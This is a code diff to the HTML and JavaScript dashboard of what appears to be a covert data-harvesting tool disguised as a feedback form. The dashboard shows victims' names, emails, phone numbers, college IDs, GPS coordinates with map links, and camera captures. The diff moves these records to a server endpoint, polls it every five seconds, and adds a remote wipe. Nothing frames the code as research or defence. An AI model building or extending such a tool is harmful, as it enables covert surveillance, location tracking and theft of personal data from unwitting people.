@@ -34,30 +34,31 @@
   function esc(s){ return String(s).replace(/[&<>"]/g, c => ({'&':'&','<':'<','>':'>','"':'"'}[c])); }
   function toast(m){ const t=document.getElementById('toast'); t.textContent=m; t.style.display='block'; setTimeout(()=>t.style.display='none',1800); }
   function load(){
-    const raw = localStorage.getItem('fb_entries');
-    const entries = raw ? JSON.parse(raw) : [];
-    const list = document.getElementById('list');
-    if(!entries.length){ list.innerHTML='<div class="card empty">No data yet. Submit the feedback form to capture a record.</div>'; return; }
-    list.innerHTML = entries.slice().reverse().map((e,i)=>`
-      <div class="card">
-        <h3 style="color:#ff0040;margin-bottom:0.5rem">Record #${entries.length-i}</h3>
-        <div class="row"><span>Name</span><span>${esc(e.name||'--')}</span></div>
-        <div class="row"><span>Email</span><span>${esc(e.email||'--')}</span></div>
-        <div class="row"><span>Phone</span><span>${esc(e.phone||'--')}</span></div>
-        <div class="row"><span>College ID</span><span>${esc(e.collegeId||'--')}</span></div>
-        <div class="row"><span>Time</span><span>${esc(e.time||'--')}</span></div>
-        <div class="row"><span>LAT</span><span>${esc(e.lat||'--')}</span></div>
-        <div class="row"><span>LNG</span><span>${esc(e.lng||'--')}</span></div>
-        ${e.lat&&e.lng&&e.lat!=='--'?`<div class="row"><span>MAP</span><span><a href="https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lng}" target="_blank">open in maps</a></span></div>`:''}
-        ${e.camshot?`<div style="margin-top:0.6rem"><span style="color:#8b949e">CAMERA CAPTURE</span><br><img src="${e.camshot}"></div>`:`<div style="margin-top:0.6rem;color:#8b949e">no camera capture</div>`}
-      </div>`).join('');
+    fetch('/data').then(r=>r.json()).then(entries=>{
+      const list=document.getElementById('list');
+      if(!entries.length){ list.innerHTML='<div class="card empty">No data yet. Submit the feedback form to capture a record.</div>'; return; }
+      list.innerHTML=entries.slice().reverse().map((e,i)=>`
+        <div class="card">
+          <h3 style="color:#ff0040;margin-bottom:0.5rem">Record #${entries.length-i}</h3>
+          <div class="row"><span>Name</span><span>${esc(e.name||'--')}</span></div>
+          <div class="row"><span>Email</span><span>${esc(e.email||'--')}</span></div>
+          <div class="row"><span>Phone</span><span>${esc(e.phone||'--')}</span></div>
+          <div class="row"><span>College ID</span><span>${esc(e.collegeId||'--')}</span></div>
+          <div class="row"><span>Time</span><span>${esc(e.time||'--')}</span></div>
+          <div class="row"><span>LAT</span><span>${esc(e.lat||'--')}</span></div>
+          <div class="row"><span>LNG</span><span>${esc(e.lng||'--')}</span></div>
+          ${e.lat&&e.lng&&e.lat!=='--'?`<div class="row"><span>MAP</span><span><a href="https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lng}" target="_blank">open in maps</a></span></div>`:''}
+          ${e.image?`<div style="margin-top:0.6rem"><span style="color:#8b949e">CAMERA CAPTURE</span><br><img src="${e.image}"></div>`:`<div style="margin-top:0.6rem;color:#8b949e">no camera capture</div>`}
+        </div>`).join('');
+    }).catch(()=>{});
   }
   function clearAll(){
-    localStorage.removeItem('fb_entries');
+    fetch('/data',{method:'DELETE'}).catch(()=>{});
     toast('DATA WIPED');
     load();
   }
   load();
+  setInterval(load,5000);
 </script>
 </body>
 </html>
